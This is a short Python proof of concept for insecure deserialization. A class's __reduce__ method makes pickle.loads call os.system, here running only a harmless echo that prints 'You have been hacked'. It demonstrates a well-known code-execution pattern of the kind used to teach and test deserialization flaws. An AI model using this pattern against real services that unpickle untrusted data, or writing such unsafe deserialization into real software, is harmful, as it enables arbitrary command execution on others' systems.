import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

pickled = pickle.dumps(RCE())
print(pickled)

deserialized = pickle.loads(pickled)
